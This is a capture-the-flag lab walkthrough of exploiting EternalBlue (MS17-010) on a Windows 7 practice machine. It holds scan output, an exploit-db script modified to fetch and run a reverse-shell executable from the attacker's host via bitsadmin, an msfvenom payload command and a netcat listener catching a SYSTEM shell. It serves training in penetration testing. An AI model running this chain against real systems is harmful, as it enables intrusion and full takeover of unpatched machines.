# IP Address: 10.10.10.40

# Enumeration
```
┌──(code㉿kali)-[~]
└─$ nmapAutomator.sh -H 10.10.10.40 -t all

Running all scans on 10.10.10.40

Host is likely running Windows

---------------------Starting Script Scan-----------------------



PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-11-13T00:43:37
|_  start_date: 2021-11-13T00:40:28
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-11-13T00:43:33+00:00
|_clock-skew: mean: 6m19s, deviation: 0s, median: 6m19s

=========================
                                                                                                   
Starting nmap scan
                                                                                                   
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-12 19:44 EST
Nmap scan report for 10.10.10.40
Host is up (0.034s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND

Nmap done: 1 IP address (1 host up) scanned in 31.96 seconds

Finished nmap scan
                                                                                                   
=========================


```

Per nmap, looks like the target may be vulnerable to MS17-010, EternalBlue. 

```
┌──(code㉿kali)-[~]
└─$ crackmapexec smb 10.10.10.40 -u 'guest' -p '' --shares
SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
SMB         10.10.10.40     445    HARIS-PC         [+] haris-PC\guest: 
SMB         10.10.10.40     445    HARIS-PC         [+] Enumerated shares
SMB         10.10.10.40     445    HARIS-PC         Share           Permissions     Remark
SMB         10.10.10.40     445    HARIS-PC         -----           -----------     ------
SMB         10.10.10.40     445    HARIS-PC         ADMIN$                          Remote Admin
SMB         10.10.10.40     445    HARIS-PC         C$                              Default share
SMB         10.10.10.40     445    HARIS-PC         IPC$                            Remote IPC
SMB         10.10.10.40     445    HARIS-PC         Share           READ            
SMB         10.10.10.40     445    HARIS-PC         Users           READ     
```

Nothing interesting on the SMB shared Share and Users.

# Exploitation

We mirror the ms17-010 exploit from exploit-db and setup the dependencies. We need to enumerate some SMB pipes for use with the exploit and set the username variable in the exploit to guest.

```
┌──(code㉿kali)-[~]
└─$ searchsploit -m windows/remote/42315.py                                                         
  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution
      URL: https://www.exploit-db.com/exploits/42315                                                
     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py                                    
File Type: Python script, ASCII text executable                                                     
                                                                                                    
Copied to: /home/code/42315.py 

┌──(code㉿kali)-[~]                                                                    
└─$ cp 42315.py tools/impacket/

┌──(code㉿kali)-[~]
└─$ cd tools/impacket/ 

┌──(code㉿kali)-[~/tools/impacket]
└─$ python 42315.py                                                                                 
42315.py <ip> [pipe_name]

┌──(code㉿kali)-[~]
└─$ python3 tools/impacket/examples/rpcdump.py -port 135 10.10.10.40
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Retrieving endpoint list from 10.10.10.40
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.10.40[49152]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\HARIS-PC[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc089EB0]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
Bindings: 
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\HARIS-PC[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc089EB0]
          ncalrpc:[WMsgKRpc08D161]
...


```

Original:
```
USERNAME = ''
PASSWORD = ''
```

Edited:
```
USERNAME = 'guest'
PASSWORD = ''
```

The exploit runs and created a proof file on the target. 
```
┌──(code㉿kali)-[~/tools/impacket]
└─$ python 42315.py 10.10.10.40 lsass                                                               
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa800198bae0
SESSION: 0xfffff8a001688060
FLINK: 0xfffff8a003bbd088
InParam: 0xfffff8a003bb715c
MID: 0x1603
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Done

```

We replace the section of code that performs the file creation and instead transfer over a reverse shell executable.

Create reverse shell payload and host it on our web server.
```
┌──(code㉿kali)-[~/tools/impacket]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4488 -f exe > reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

┌──(code㉿kali)-[~/tools/impacket]
└─$ sudo cp reverse.exe /var/www/html/

┌──(code㉿kali)-[~/tools/impacket]
└─$ sudo service apache2 start  
```

Edit the exploit code.
Original:
```

def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()
	
	print('creating file c:\\pwned.txt on the target')
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)
	
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
	# Note: there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."
```
New:
```
def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()

        service_exec(conn, r'cmd /c bitsadmin /transfer transfer1 /download http://10.10.14.7/reverse.exe C:\reverse.exe')
    service_exec(conn, r'cmd /c /reverse.exe')
```
Resolve issue with spaces/indents in Vim:
hit escape then type `gg=G`

Run the exploit.
```
┌──(code㉿kali)-[~/tools/impacket]
└─$ python 42315.py 10.10.10.40 atsvc
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
No transaction struct in leak data
leak failed... try again
CONNECTION: 0xfffffa8002208020
SESSION: 0xfffff8a001e9daa0
FLINK: 0xfffff8a0044c7048
InParam: 0xfffff8a0046d315c
MID: 0x1807
unexpected alignment, diff: 0x-20cfb8
leak failed... try again
No transaction struct in leak data
leak failed... try again
CONNECTION: 0xfffffa8002208020
SESSION: 0xfffff8a001e9daa0
FLINK: 0xfffff8a004703088
InParam: 0xfffff8a0046f715c
MID: 0x1903
unexpected alignment, diff: 0xb088
leak failed... try again
CONNECTION: 0xfffffa8002208020
SESSION: 0xfffff8a001e9daa0
FLINK: 0xfffff8a00470f088
InParam: 0xfffff8a00470915c
MID: 0x1903
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Opening SVCManager on 10.10.10.40.....
Creating service swrA.....
Starting service swrA.....
SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
Removing service swrA.....
Opening SVCManager on 10.10.10.40.....
Creating service FZPp.....
Starting service FZPp.....
SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
Removing service FZPp.....
Done

```

On netcat listener:
```
┌──(code㉿kali)-[~]
└─$ nc -nlvp 4488
listening on [any] 4488 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.40] 49160
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

# Proof
user.txt

![user.txt](https://github.com/codetantrum/walkthroughs/blob/master/Blue/images/Pasted%20image%2020211113103833.png)

root.txt

![root.txt](https://github.com/codetantrum/walkthroughs/blob/master/Blue/images/Pasted%20image%2020211113103918.png)
